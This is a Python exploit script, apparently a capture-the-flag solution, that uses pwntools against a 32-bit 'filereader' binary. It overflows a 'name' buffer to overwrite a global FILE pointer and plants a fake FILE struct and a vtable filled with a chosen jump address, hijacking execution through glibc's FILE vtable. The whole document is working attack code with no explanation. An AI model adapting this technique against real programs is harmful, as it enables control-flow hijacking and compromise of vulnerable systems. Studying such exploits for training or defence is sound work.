#! /usr/bin/env python3

import struct
from os.path import realpath
from pwn import *

ld_path = realpath("ld-2.23.so")
lib_path = realpath(".")
bin_path = realpath("filereader")

# Build an i386 word (32-bit, little-endian):
def build_word(num):
    return struct.pack(">I", num)[::-1]

# Build a FILE struct in i386:
def build_file_struct(flags):
    return build_word(flags) + padding * 144

# Build a vtable in i386:
def build_vtable(addr):
    return build_word(addr) * 21

context(arch = 'i386', os = 'linux', endian='little') # Context of target binary

padding = b'\x00'

# Commands of the filereader:
cmd_open = 1
cmd_read = 2
cmd_print = 3
cmd_close = 4
cmd_exit = 5

flags = 0x80018001 # Flags of the fake FILE struct to be built

fp_addr = 0x804b280 # Address of the global variable 'fp' from the target binary
jump_addr = 0x8048955 # Address to be written to the intruction pointer

name = padding * 32 # Contents of variable 'name'
fake_fp = build_word(fp_addr + 0x4) # Fake pointer that will overwrite 'fp'
fake_file = build_file_struct(flags) # Fake FILE struct
fake_vtp = build_word(fp_addr + len(fake_fp) + len(fake_file) + 0x4) # Fake pointer to the vtable
fake_vtable = build_vtable(jump_addr) # Fake vtable

payload = name + fake_fp + fake_file + fake_vtp + fake_vtable # Data to be passed as input

# Explicitly link the provided library using the provided linker:
p = process(argv=[ld_path, bin_path], env={"LD_LIBRARY_PATH":lib_path})
print(p.recv().decode(), end=" ")

# Send command to open file:
p.sendline(str(cmd_open))
print(cmd_open)
print(p.recv().decode(), end=" ")

# Send path of file to be open:
p.sendline("/dev/null")
print("/dev/null")
print(p.recv().decode(), end=" ")

# Send command to exit program:
p.sendline(str(cmd_exit))
print(cmd_exit)
print(p.recv().decode(), end=" ")

# Perform buffer overflow attack on the 'name' buffer:
p.write(payload)
p.sendline("")
print("")
print(p.recv().decode(), end="")